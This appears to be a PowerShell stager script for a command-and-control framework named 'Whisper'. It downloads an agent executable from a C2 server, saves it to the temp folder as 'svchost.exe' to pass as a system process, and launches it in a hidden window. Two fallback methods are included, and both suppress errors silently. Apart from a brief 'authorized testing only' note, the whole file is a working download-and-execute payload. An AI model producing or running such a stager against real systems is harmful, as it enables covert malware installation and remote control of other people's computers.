<#
.SYNOPSIS
    Whisper PowerShell Stager - Downloads and executes agent silently
.DESCRIPTION
    Downloads the agent EXE from the C2 web server and runs it in a hidden window.
    Edit the $serverUrl variable before use.
.NOTES
    Authorized testing only.
#>

$serverUrl = "http://127.0.0.1:8080"
$payloadPath = "$env:TEMP\svchost.exe"

# Method 1: Direct download + execute
try {
    (New-Object System.Net.WebClient).DownloadFile("$serverUrl/agent.exe", $payloadPath)
    Start-Process -WindowStyle Hidden -FilePath $payloadPath
    exit
} catch {
    # Fallback silently
}

# Method 2: Memory download + write
try {
    $wc = New-Object System.Net.WebClient
    $data = $wc.DownloadData("$serverUrl/agent.exe")
    [System.IO.File]::WriteAllBytes($payloadPath, $data)
    Start-Process -WindowStyle Hidden -FilePath $payloadPath
} catch {}
